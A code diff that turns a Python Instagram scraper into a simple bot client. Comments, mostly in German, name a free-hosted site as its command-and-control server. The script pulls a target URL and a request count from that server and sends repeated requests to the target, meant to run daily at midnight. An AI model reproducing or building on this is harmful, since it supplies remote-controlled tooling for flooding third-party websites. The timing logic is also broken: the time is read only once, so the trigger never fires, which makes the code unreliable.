@@ -1,26 +1,26 @@
 import requests
-import urllib.request
-from requests.exceptions import ConnectTimeout
-url = "https://www.instagram.com/"
+import time
+# command and controll website
+url = "https://infofacharbeit.000webhostapp.com/"
 def start():
-    with open('o.txt', 'r') as file:
-        for line in file:
-            final_url = url + line
-            final_url.replace(" ", "")
-            if requests.get(final_url).status_code == 200:
-                page = urllib.request.urlopen(final_url)
-                lst = []
-                for i in page.read():
-                    lst.append(chr(i))
-                j = False
-                str = ""
-                for i in lst:
-                    if i=="ö":
-                        if j:
-                            j=False
-                        else:
-                            j=True
-                    elif j:
-                        str+=i
-                print(str)
-start()
+    #ruft informationen der Website ab
+    req = requests.get(url)
+    #betritt die Bedingung, wenn die website mit "ok" antwortet
+    if req.status_code == 200:
+        #source code
+        source = req.text
+        #Ziel Url
+        attack_url = source[2:]
+        #t = anzahl der zugriffe
+        t = int(source[1])
+        for i in range(0,t,1):
+            print(requests.get(attack_url).text)  
+#ruft die aktuelle zeit ab
+current_time = time.localtime()
+hours = current_time.tm_hour
+minutes = current_time.tm_min
+seconds = current_time.tm_sec
+#1x am tag wird start abgerufen
+while True:
+    if hours == 0 and minutes == 0 and seconds == 0:
+        start()
